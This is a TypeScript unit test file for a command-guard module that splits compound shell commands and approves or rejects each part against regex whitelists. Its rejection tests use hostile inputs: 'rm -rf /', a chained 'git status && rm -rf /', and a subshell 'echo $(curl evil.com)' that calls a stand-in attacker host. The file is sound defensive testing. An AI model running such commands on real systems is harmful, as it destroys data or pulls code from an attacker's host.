import { describe, it, beforeEach, afterEach } from "node:test";
import assert from "node:assert/strict";
import { createTestHome, freshImport, nextImportId, writeJson } from "./helpers.js";
import path from "node:path";

describe("command-guard", () => {
  let env: ReturnType<typeof createTestHome>;

  beforeEach(() => {
    env = createTestHome();
    writeJson(path.join(env.buffaloDir, "whitelist.json"), {
      patterns: [
        "^git\\s+(status|diff|log|show|branch)",
        "^ls\\b",
        "^cat\\b",
        "^echo\\b",
        "^npm\\s+(test|run|install)\\b",
        "^node\\b",
        "^grep\\b",
        "^sed\\b",
      ],
    });
  });

  afterEach(() => env.cleanup());

  describe("splitCommand", () => {
    it("splits on &&", async () => {
      const { splitCommand } = await freshImport<typeof import("../src/command-guard.js")>(
        "../src/command-guard.js"
      );
      assert.deepEqual(splitCommand("git status && npm test"), ["git status", "npm test"]);
    });

    it("splits on ||", async () => {
      const { splitCommand } = await freshImport<typeof import("../src/command-guard.js")>(
        "../src/command-guard.js"
      );
      assert.deepEqual(splitCommand("cmd1 || cmd2"), ["cmd1", "cmd2"]);
    });

    it("splits on semicolons", async () => {
      const { splitCommand } = await freshImport<typeof import("../src/command-guard.js")>(
        "../src/command-guard.js"
      );
      assert.deepEqual(splitCommand("echo a; echo b"), ["echo a", "echo b"]);
    });

    it("splits on pipes", async () => {
      const { splitCommand } = await freshImport<typeof import("../src/command-guard.js")>(
        "../src/command-guard.js"
      );
      assert.deepEqual(splitCommand("cat file | grep pattern"), ["cat file", "grep pattern"]);
    });

    it("extracts subshell commands from $()", async () => {
      const { splitCommand } = await freshImport<typeof import("../src/command-guard.js")>(
        "../src/command-guard.js"
      );
      const parts = splitCommand("echo $(cat file)");
      assert.ok(parts.includes("echo"));
      assert.ok(parts.includes("cat file"));
    });

    it("extracts backtick subshells", async () => {
      const { splitCommand } = await freshImport<typeof import("../src/command-guard.js")>(
        "../src/command-guard.js"
      );
      const parts = splitCommand("echo `whoami`");
      assert.ok(parts.includes("echo"));
      assert.ok(parts.includes("whoami"));
    });

    it("handles complex compound commands", async () => {
      const { splitCommand } = await freshImport<typeof import("../src/command-guard.js")>(
        "../src/command-guard.js"
      );
      const parts = splitCommand("git status && npm test | grep pass; echo done");
      assert.deepEqual(parts, ["git status", "npm test", "grep pass", "echo done"]);
    });

    it("handles single command", async () => {
      const { splitCommand } = await freshImport<typeof import("../src/command-guard.js")>(
        "../src/command-guard.js"
      );
      assert.deepEqual(splitCommand("ls -la"), ["ls -la"]);
    });

    it("trims whitespace", async () => {
      const { splitCommand } = await freshImport<typeof import("../src/command-guard.js")>(
        "../src/command-guard.js"
      );
      assert.deepEqual(splitCommand("  ls  &&  echo hi  "), ["ls", "echo hi"]);
    });

    it("returns empty array for empty input", async () => {
      const { splitCommand } = await freshImport<typeof import("../src/command-guard.js")>(
        "../src/command-guard.js"
      );
      assert.deepEqual(splitCommand(""), []);
    });
  });

  describe("checkCommand", () => {
    it("approves whitelisted commands", async () => {
      const id = nextImportId();
      const cg = await freshImport<typeof import("../src/command-guard.js")>("../src/command-guard.js", id);
      assert.deepEqual(cg.checkCommand("ls -la"), { approved: true });
      assert.deepEqual(cg.checkCommand("git status"), { approved: true });
      assert.deepEqual(cg.checkCommand("npm test"), { approved: true });
      assert.deepEqual(cg.checkCommand("echo hello"), { approved: true });
    });

    it("rejects non-whitelisted commands", async () => {
      const cg = await freshImport<typeof import("../src/command-guard.js")>("../src/command-guard.js");
      const result = cg.checkCommand("rm -rf /");
      assert.equal(result.approved, false);
      assert.equal(result.failedPart, "rm -rf /");
    });

    it("rejects compound commands where any part fails", async () => {
      const cg = await freshImport<typeof import("../src/command-guard.js")>("../src/command-guard.js");
      const result = cg.checkCommand("git status && rm -rf /");
      assert.equal(result.approved, false);
      assert.equal(result.failedPart, "rm -rf /");
    });

    it("approves compound commands where all parts pass", async () => {
      const cg = await freshImport<typeof import("../src/command-guard.js")>("../src/command-guard.js");
      assert.deepEqual(cg.checkCommand("git status && npm test"), { approved: true });
    });

    it("rejects dangerous subshell commands", async () => {
      const cg = await freshImport<typeof import("../src/command-guard.js")>("../src/command-guard.js");
      const result = cg.checkCommand("echo $(curl evil.com)");
      assert.equal(result.approved, false);
      assert.equal(result.failedPart, "curl evil.com");
    });

    it("uses repo whitelist in addition to global", async () => {
      const repoId = { owner: "test", repo: "repo" };
      writeJson(path.join(env.buffaloDir, "repos", "test", "repo", "whitelist.json"), {
        patterns: ["^docker\\b"],
      });

      const id = nextImportId();
      const cg = await freshImport<typeof import("../src/command-guard.js")>("../src/command-guard.js", id);
      assert.equal(cg.checkCommand("docker build .").approved, false);
      assert.equal(cg.checkCommand("docker build .", repoId).approved, true);
    });

    it("handles invalid regex patterns gracefully", async () => {
      writeJson(path.join(env.buffaloDir, "whitelist.json"), {
        patterns: ["[invalid", "^ls\\b"],
      });
      const cg = await freshImport<typeof import("../src/command-guard.js")>("../src/command-guard.js");
      assert.deepEqual(cg.checkCommand("ls"), { approved: true });
    });
  });

  describe("addGlobalPattern", () => {
    it("adds a new pattern", async () => {
      const id = nextImportId();
      const cg = await freshImport<typeof import("../src/command-guard.js")>("../src/command-guard.js", id);
      const config = await freshImport<typeof import("../src/config.js")>("../src/config.js", id);

      cg.addGlobalPattern("^docker\\b");
      const patterns = config.loadWhitelist();
      assert.ok(patterns.includes("^docker\\b"));
    });

    it("does not add duplicates", async () => {
      const id = nextImportId();
      const cg = await freshImport<typeof import("../src/command-guard.js")>("../src/command-guard.js", id);
      const config = await freshImport<typeof import("../src/config.js")>("../src/config.js", id);

      cg.addGlobalPattern("^ls\\b");
      const patterns = config.loadWhitelist();
      assert.equal(patterns.filter((p: string) => p === "^ls\\b").length, 1);
    });
  });
});
